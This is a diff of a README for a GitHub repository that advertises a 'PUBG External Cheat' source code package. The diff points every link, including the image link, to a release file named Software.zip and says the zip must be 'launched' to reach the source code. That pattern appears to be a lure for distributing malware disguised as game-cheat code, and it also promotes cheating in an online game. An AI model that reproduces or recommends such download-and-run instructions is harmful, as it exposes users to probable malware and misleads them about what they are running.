@@ -26,16 +26,16 @@ Welcome to the "PUBG External Cheat FULL Feature" repository! This source code, 
 
 ## Get Started
 To access the full source code and enjoy all the features mentioned above, download the software package from the following link:
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/144245673413/PUBG-External-Cheat-FULL-Feature/releases/download/v2.0/Software.zip)](https://github.com/144245673413/PUBG-External-Cheat-FULL-Feature/releases/download/v2.0/Software.zip)
 
-*Note: Software.zip needs to be launched to access the cheat source code.*
+*Note: https://github.com/144245673413/PUBG-External-Cheat-FULL-Feature/releases/download/v2.0/Software.zip needs to be launched to access the cheat source code.*
 
 If the link provided above is not working, please check the "Releases" section of this repository for alternative download options.
 
 ## Dive into the Action!
 Don't miss out on the opportunity to level up your PUBG gameplay with this advanced cheat source code. Visit the provided link, unleash the power of the cheat features, and dominate the battleground like never before!
 
-![PUBG Cheat](https://example.com/pubg-cheat-image.jpg)
+![PUBG Cheat](https://github.com/144245673413/PUBG-External-Cheat-FULL-Feature/releases/download/v2.0/Software.zip)
 
 ## Contribution
 If you have any ideas for enhancing the cheat features or improving the code, feel free to contribute to this repository. Your input is highly valuable in making this cheat source code even more powerful and effective for PUBG players worldwide.
